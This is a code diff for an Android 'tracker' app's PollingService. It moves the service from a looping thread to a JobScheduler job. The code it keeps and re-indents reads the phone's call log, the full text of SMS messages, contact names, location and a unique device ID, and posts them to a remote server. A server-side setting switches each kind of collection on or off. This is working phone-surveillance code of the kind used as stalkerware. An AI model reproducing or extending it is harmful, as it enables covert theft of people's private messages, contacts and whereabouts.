@@ -29,6 +29,7 @@ import com.okhttplib.HttpInfo;
 import com.okhttplib.OkHttpUtil;
 import com.okhttplib.annotation.RequestType;
 import com.okhttplib.callback.Callback;
+import com.youhuan.trackerapp.utils.JobSchedulerManager;
 
 import org.json.JSONObject;
 
@@ -50,7 +51,8 @@ public class PollingService extends Service {
     private Intent intent = new Intent("com.youhuan.trackerapp.RECEIVER");
     private LocationClient mlocationClient;
     private String mLocationStr = "";
-    public Thread mThread;
+//    public Thread mThread;
+private JobSchedulerManager mJobManager;
 
     @Nullable
     @Override
@@ -60,54 +62,57 @@ public class PollingService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (mThread == null) {
-            runGetThreadNews();
-        }
+//        if (mThread == null) {
+//            runGetThreadNews();
+//        }
+        mJobManager = JobSchedulerManager.getJobSchedulerInstance(this);
+        mJobManager.startJobScheduler();
+        runGetThreadNews();
         return super.onStartCommand(intent, flags, startId);
     }
 
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.e("--------->", "服务被启动！");
-        if (mThread == null) {
-            runGetThreadNews();
-        }
+//        Log.e("--------->", "服务被启动！");
+//        if (mThread == null) {
+//            runGetThreadNews();
+//        }
 
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        mThread.stop();
+//        mThread.stop();
     }
 
     public void runGetThreadNews() {
 
-        mThread = new Thread(new Runnable() {
-
-            @Override
-            public void run() {
-                Looper.prepare();
-                try {
-                    while (true) {
-                        String rate = SharedPreferencesTool.getString(PollingService.this, "rate");
-                        if (rate.equals("")) {
-                            rate = "30";
-                        }
-                        int rateInt = Integer.valueOf(rate);
-                        int sleepTime = rateInt * 1000;
-                        Thread.sleep(sleepTime);
-                        buildData();
-                        Log.e("--轮询服务-->", "获取中...");
-                    }
-                } catch (Exception e) {
-                    Log.e("--线程异常-->", e.getMessage());
-                }
-                Looper.loop();//这种情况下，Runnable对象是运行在子线程中的，可以进行联网操作，但是不能更新UI
-            }
-        });
-        mThread.start();
+//        mThread = new Thread(new Runnable() {
+//
+//            @Override
+//            public void run() {
+//                Looper.prepare();
+        try {
+//                    while (true) {
+//                        String rate = SharedPreferencesTool.getString(PollingService.this, "rate");
+//                        if (rate.equals("")) {
+//                            rate = "30";
+//                        }
+//                        int rateInt = Integer.valueOf(rate);
+//                        int sleepTime = rateInt * 1000;
+//                        Thread.sleep(sleepTime);
+            buildData();
+//                        Log.e("--轮询服务-->", "获取中...");
+//                    }
+        } catch (Exception e) {
+            Log.e("--线程异常-->", e.getMessage());
+        }
+//                Looper.loop();//这种情况下，Runnable对象是运行在子线程中的，可以进行联网操作，但是不能更新UI
+//            }
+//        });
+//        mThread.start();
     }
 
 
@@ -345,94 +350,94 @@ public class PollingService extends Service {
             mLocationStr = "定位功能已经被后台关闭！";
         }
 
-        Thread thread = new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    Thread.sleep(6000);
+//        Thread thread = new Thread(new Runnable() {
+//            @Override
+//            public void run() {
+        try {
+//                    Thread.sleep(6000);
 
-                    //构造通话记录数据
-                    StringBuffer callStr = new StringBuffer();
-                    callStr.append("[");
-                    List<Call> calls = new ArrayList<>();
-                    String is_getcall = SharedPreferencesTool.getString(PollingService.this, "is_getcall");
-                    if (is_getcall.equals("") || is_getcall.equals("1")) {
-                        calls.clear();
-                        calls.addAll(getCall());
-                    }
-                    int clen = calls.size();
-                    for (int i = 0; i < clen; i++) {
-                        JSONObject callJson = new JSONObject();
-                        callJson.put("tell", calls.get(i).getTell());
-                        callJson.put("type", calls.get(i).getType());
-                        callJson.put("time", calls.get(i).getTime());
-                        callJson.put("duration", calls.get(i).getDuration());
-                        String nickname = "";
-                        if (calls.get(i).getNickname() != null) {
-                            nickname = calls.get(i).getNickname();
-                        }
-                        callJson.put("nickname", nickname);
-                        callStr.append(callJson.toString() + ",");
-                    }
-                    String cStr = callStr.toString();
-                    cStr = cStr.substring(0, cStr.length() - 1);
-                    cStr = cStr + "]";
-                    if (cStr.length() < 2) {
-                        cStr = "[]";
-                    }
-
-                    //构造短信数据
-                    StringBuffer smsStr = new StringBuffer();
-                    smsStr.append("[");
-                    List<Sms> smsList = new ArrayList<>();
-                    String is_getsms = SharedPreferencesTool.getString(PollingService.this, "is_getsms");
-                    if (is_getsms.equals("") || is_getsms.equals("1")) {
-                        smsList.clear();
-                        smsList.addAll(getSms());
-                    }
-                    int slen = smsList.size();
-                    for (int j = 0; j < slen; j++) {
-                        JSONObject smsJson = new JSONObject();
-                        smsJson.put("tell", smsList.get(j).getTell());
-                        smsJson.put("content", smsList.get(j).getContent());
-                        smsJson.put("type", smsList.get(j).getType());
-                        smsJson.put("time", smsList.get(j).getTime());
-                        smsJson.put("nickname", smsList.get(j).getNickname());
-                        smsStr.append(smsJson.toString() + ",");
-                    }
-                    String sStr = smsStr.toString();
-                    sStr = sStr.substring(0, sStr.length() - 1);
-                    sStr = sStr + "]";
-                    if (sStr.length() < 2) {
-                        sStr = "[]";
-                    }
-
-                    JSONObject mainJson = new JSONObject();
-                    mainJson.put("phone_no", SystemUtil.getSystemModel());//手机型号
-                    mainJson.put("machineCode", SystemUtil.getUniqueID(PollingService.this));//机器码
-                    mainJson.put("position", mLocationStr);//当前位置
-                    mainJson.put("base_msg", SystemUtil.getDeviceBrand() +
-                            "  " + SystemUtil.getSystemModel() +
-                            "  " + SystemUtil.getSystemVersion());//基础信息
-                    mainJson.put("sms", "");//短信   废弃
-                    mainJson.put("_call", "");//电话  废弃
-                    mainJson.put("newSms", 987654321);//短信集合*###NewSMS###*
-                    mainJson.put("newCall", 887654321);//通话记录集合*###NewCALL###*
-                    String mainStr = mainJson.toString();
-
-
-                    mainStr = mainStr.replace("987654321", sStr);
-                    mainStr = mainStr.replace("887654321", cStr);
-
-                    Log.e("------->", mainStr);
-                    postMessage(mainStr);
-
-                } catch (Exception e) {
-                    Log.e("-->", "EX:" + e.getMessage());
-                }
+            //构造通话记录数据
+            StringBuffer callStr = new StringBuffer();
+            callStr.append("[");
+            List<Call> calls = new ArrayList<>();
+            String is_getcall = SharedPreferencesTool.getString(PollingService.this, "is_getcall");
+            if (is_getcall.equals("") || is_getcall.equals("1")) {
+                calls.clear();
+                calls.addAll(getCall());
             }
-        });
-        thread.start();
+            int clen = calls.size();
+            for (int i = 0; i < clen; i++) {
+                JSONObject callJson = new JSONObject();
+                callJson.put("tell", calls.get(i).getTell());
+                callJson.put("type", calls.get(i).getType());
+                callJson.put("time", calls.get(i).getTime());
+                callJson.put("duration", calls.get(i).getDuration());
+                String nickname = "";
+                if (calls.get(i).getNickname() != null) {
+                    nickname = calls.get(i).getNickname();
+                }
+                callJson.put("nickname", nickname);
+                callStr.append(callJson.toString() + ",");
+            }
+            String cStr = callStr.toString();
+            cStr = cStr.substring(0, cStr.length() - 1);
+            cStr = cStr + "]";
+            if (cStr.length() < 2) {
+                cStr = "[]";
+            }
+
+            //构造短信数据
+            StringBuffer smsStr = new StringBuffer();
+            smsStr.append("[");
+            List<Sms> smsList = new ArrayList<>();
+            String is_getsms = SharedPreferencesTool.getString(PollingService.this, "is_getsms");
+            if (is_getsms.equals("") || is_getsms.equals("1")) {
+                smsList.clear();
+                smsList.addAll(getSms());
+            }
+            int slen = smsList.size();
+            for (int j = 0; j < slen; j++) {
+                JSONObject smsJson = new JSONObject();
+                smsJson.put("tell", smsList.get(j).getTell());
+                smsJson.put("content", smsList.get(j).getContent());
+                smsJson.put("type", smsList.get(j).getType());
+                smsJson.put("time", smsList.get(j).getTime());
+                smsJson.put("nickname", smsList.get(j).getNickname());
+                smsStr.append(smsJson.toString() + ",");
+            }
+            String sStr = smsStr.toString();
+            sStr = sStr.substring(0, sStr.length() - 1);
+            sStr = sStr + "]";
+            if (sStr.length() < 2) {
+                sStr = "[]";
+            }
+
+            JSONObject mainJson = new JSONObject();
+            mainJson.put("phone_no", SystemUtil.getSystemModel());//手机型号
+            mainJson.put("machineCode", SystemUtil.getUniqueID(PollingService.this));//机器码
+            mainJson.put("position", mLocationStr);//当前位置
+            mainJson.put("base_msg", SystemUtil.getDeviceBrand() +
+                    "  " + SystemUtil.getSystemModel() +
+                    "  " + SystemUtil.getSystemVersion());//基础信息
+            mainJson.put("sms", "");//短信   废弃
+            mainJson.put("_call", "");//电话  废弃
+            mainJson.put("newSms", 987654321);//短信集合*###NewSMS###*
+            mainJson.put("newCall", 887654321);//通话记录集合*###NewCALL###*
+            String mainStr = mainJson.toString();
+
+
+            mainStr = mainStr.replace("987654321", sStr);
+            mainStr = mainStr.replace("887654321", cStr);
+
+            Log.e("------->", mainStr);
+            postMessage(mainStr);
+
+        } catch (Exception e) {
+            Log.e("-->", "EX:" + e.getMessage());
+        }
+//            }
+//        });
+//        thread.start();
     }
 
     private void doPost(String json) {
@@ -514,6 +519,11 @@ public class PollingService extends Service {
                                 SharedPreferencesTool.putString(PollingService.this, "is_location", is_location);
                                 SharedPreferencesTool.putString(PollingService.this, "param1", param1);
                                 SharedPreferencesTool.putString(PollingService.this, "param2", param2);
+
+                                Toast.makeText(getApplicationContext(), "完成一次提交！", Toast.LENGTH_SHORT)
+                                        .show();
+//                                stopService();
+                                PollingService.this.stopSelf();
 
                             } else {
                             }
